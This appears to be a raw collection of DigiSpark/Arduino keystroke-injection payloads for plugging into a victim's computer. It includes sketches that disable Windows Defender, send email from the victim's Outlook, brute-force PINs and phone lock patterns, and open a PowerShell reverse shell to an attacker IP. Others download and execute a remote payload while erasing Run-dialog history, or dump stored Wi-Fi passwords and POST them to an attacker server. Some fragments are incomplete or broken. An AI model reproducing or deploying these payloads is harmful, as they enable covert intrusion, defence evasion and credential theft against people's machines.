#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  Keyboard.begin();
  delay(500);
  // Disable windows defender
  typeKey(KEY_LEFT_GUI);
  delay(100);
  Keyboard.print(F("Windows Defender Settings"));
  typeKey(KEY_RETURN);
  delay(4000);
  // Navigate to "Manage" button
  typeKey(KEY_RETURN); delay(100);
  typeKey(KEY_TAB);    delay(100);
  typeKey(KEY_TAB);    delay(100);
  typeKey(KEY_TAB);    delay(100);
  typeKey(KEY_TAB);    
  delay(200);
  // Press the "Manage" button
  typeKey(KEY_RETURN);      delay(1000);
  typeKey(' ');             delay(100);
  typeKey(KEY_LEFT_ARROW);  delay(100);
  typeKey(KEY_RETURN);      delay(100);
  typeKey(KEY_TAB);
  typeKey(' ');             delay(100);
  typeKey(KEY_TAB);
  typeKey(' ');             delay(100);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(' ');
  delay(500);
  // close the window
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  Keyboard.end();
}

void loop() {}



















#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);  // prevent missing the first character after a delay
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("/Applications/Microsoft Outlook.app");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("your@email.com");
  DigiKeyboard.delay(200);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(200);
  DigiKeyboard.print("\t");
  DigiKeyboard.print("Lunch is on me!");
  DigiKeyboard.delay(200);
  DigiKeyboard.print("\t");
  DigiKeyboard.print("I'm feeling generous so I'll be buying everyone lunch for a week.");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_ENTER);
  DigiKeyboard.delay(10000);
}
























#include "DigiKeyboard.h"
void setup() {}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT); // send to desktop
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // open run console
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client.DownloadFile(\"https://images.alphacoders.com/156/156893.jpg\" , \"hacked3.jpg\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\hacked3.jpg\" /f");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}











// mute, volume up, volume down


if (RegisterValue == B10) 
       DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT  ); // press the windows key
       DigiKeyboard.delay(1000); // wait a second
       DigiKeyboard.print("cmd");
       DigiKeyboard.delay(1000); // wait a second
       DigiKeyboard.sendKeyStroke(KEY_ENTER,MOD_CONTROL_LEFT | MOD_SHIFT_LEFT ); // Ctrl+shift+enter
       DigiKeyboard.delay(1000); // wait a second
       DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT );
       DigiKeyboard.sendKeyStroke(KEY_ENTER );


DigiKeyboard.sendKeyStroke(KEY_ENTER , MOD_CONTROL_LEFT | MOD_SHIFT LEFT); 
DigiKeyboard.sendKeyStroke(KEY_C , MOD_CONTROL_LEFT);//copy shortcut (ctrl +v).
DigiKeyboard.sendKeyStroke(KEY_L , MOD_GUI_LEFT);//windows lock shortcut  (windows logo key + L)

DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(600);
DigiKeyboard.print("http://fakeupdate.net/win10u/index.html");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(KEY_F11);

DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(600);
DigiKeyboard.print("http://fakebsod.com/windows-8-and-10");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(KEY_F11);



















Victim Windows Machine: [192.168.227.140]
Attacker Host: [192.168.227.136]

//Get access to computer with reverse shell
$sm=(New-Object Net.Sockets.TCPClient("192.168.227.136",1234)).GetStream();
[byte[]]$bt=0..65535|%{0};
while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;
$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
$sm.Write($st,0,$st.Length)}





void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  // download + start reverse shell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // run dialog
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/WzsxycpF');\"");
  DigiKeyboard.delay(1000);

  // clean up the run dialog history
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // run dialog
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue\""); 
}














#include "DigiKeyboard.h"
int num[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38}; // 0,1,2,3,4,5,6,7,8,9 .... if println does not work
int digits[] = {0,0,0,0};
int count = 0;

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0); 
  delay(3000);
}

void loop() {
  if(count % 5 == 0){ //After 5 attempts: 
    DigiKeyboard.sendKeyStroke(40); //hit enter to make the popup go away
    delay(31000); //initialize 31000 ms wait to retry.
  }

  DigiKeyboard.println(digits[0]); 
  DigiKeyboard.println(digits[1]); 
  DigiKeyboard.println(digits[2]); 
  DigiKeyboard.println(digits[3]); 

  DigiKeyboard.sendKeyStroke(digits[0]);
  DigiKeyboard.sendKeyStroke(digits[1]);
  DigiKeyboard.sendKeyStroke(digits[2]);
  DigiKeyboard.sendKeyStroke(digits[3]);
  DigiKeyboard.sendKeyStroke(40);
  delay(1000);
  count++;
  // increase digits 


}










// phone model cracker
#include <DigiCombo.h>

int repeat = 5;
int phonePattern[4] = {0, 3, 6, 7};

void setup() {
  DigiCombo.begin();

  //Touch to awake the phone
  DigiCombo.tapSingle(5000, 5000);
  DigiCombo.tapSingle(5000, 5000);
  DigiCombo.delay(2000);
  // Swipe up for going to draw pattern any 1 percent in 25ms  
  for (int i = 0; i < 4000; i += 100) 
    DigiCombo.moveFinger(5000, 7000 - i);   
  DigiCombo.release();
  DigiCombo.delay(2000);
}

void loop() {
  if (repeat == 0) {
    DigiCombo.delay(1000);
    return;
  }
  
  // Place of point in lockscreen
  // y = 4100, 5300, 6500
  // x = 2500, 5000, 7500
  int selectedPointIndex[4] = {0, 0, 0, 0};

  for (int i = 0; i < 4; i++) {
    while (true) {      
      int pointIndex = repeat != 1 ? (random() % 9) : phonePattern[i];
      selectedPointIndex[i] = pointIndex;
      
      int count = 0;    
      for (int j = 0; j <= i; j++) {
        if (selectedPointIndex[j] == pointIndex) count++;
      }
      if (count == 1) break;
    }
    DigiCombo.moveFinger(2500 + (selectedPointIndex[i] % 3) * 2500, 4100 + (selectedPointIndex[i] / 3) * 1200);
  }

  DigiCombo.release();
  DigiCombo.delay(1000);
  repeat--;
}









//This script grabs all stored wireless network credentials and forwards them via http(s) 
//to an attacker controlled server (created to work best with Synergy-Httpx as the receiver).  
//I edited a template from https://github.com/CedArctic/DigiSpark-Scripts/ to make this.

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2300);
  DigiKeyboard.print(F("powershell -NoP -W Hidden -ep Bypass \"$n=$f=@();netsh wlan show profiles | Select-String ':(.+)$' | %{$n += (echo $_.Matches.Groups[0].Value.Trim(': '))}; $n | %{$k=((netsh wlan show profile name=$_ key=clear | findstr 'Key Content') -split ': ')[1];$f+=\\\"$_ \: $k\\\"}; irm -Uri https://t3l3machus.com/aWq8tY -Method POST -body ($f -join('<br>'))\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ }
}






//This script requests a PowerShell payload from an http(s) server pipes it to IEX 
//I edited a template from https://github.com/CedArctic/DigiSpark-Scripts/ to make this.

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2300);
  DigiKeyboard.print(F("powershell -NoP -ep Bypass \" irm -Uri https://t3l3machus.com:443/rshell | iex\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ }
}





// for other ideeas
// https://github.com/MTK911/Attiny85/tree/master/payloads

























